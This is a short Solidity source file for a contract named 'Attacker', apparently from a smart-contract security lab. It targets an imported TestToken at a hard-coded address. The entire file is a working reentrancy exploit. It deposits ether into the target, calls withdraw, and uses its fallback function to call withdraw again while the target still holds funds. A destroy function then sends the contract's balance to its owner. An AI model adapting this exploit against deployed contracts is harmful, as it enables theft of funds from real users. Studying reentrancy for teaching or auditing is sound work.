pragma solidity ^0.5.0;

import "./03_ERC20.sol";

contract Attacker {
    address payable public drain;
    address payable public owner;

    TestToken testToken;

    constructor() public payable {
        drain = address(0x7B54F625F8dF5646D4E75B6A44105C46C88CED65);
        testToken = TestToken(drain);
        owner = msg.sender;
    }

    function deposit() public payable {
        require(msg.value > 0);
        drain.call.value(msg.value)(abi.encodeWithSignature("deposit()"));
    }

    function withdraw() public payable returns (bool success) {
        drain.call.value(msg.value)(abi.encodeWithSignature("withdraw()"));
        return true;
    }

    function destroy() public {
        msg.sender.call.value(address(this).balance);
        selfdestruct(owner);
    }

    function() external payable {
        if (drain.balance > msg.value) {
            testToken.withdraw(msg.value);
        }
    }
}
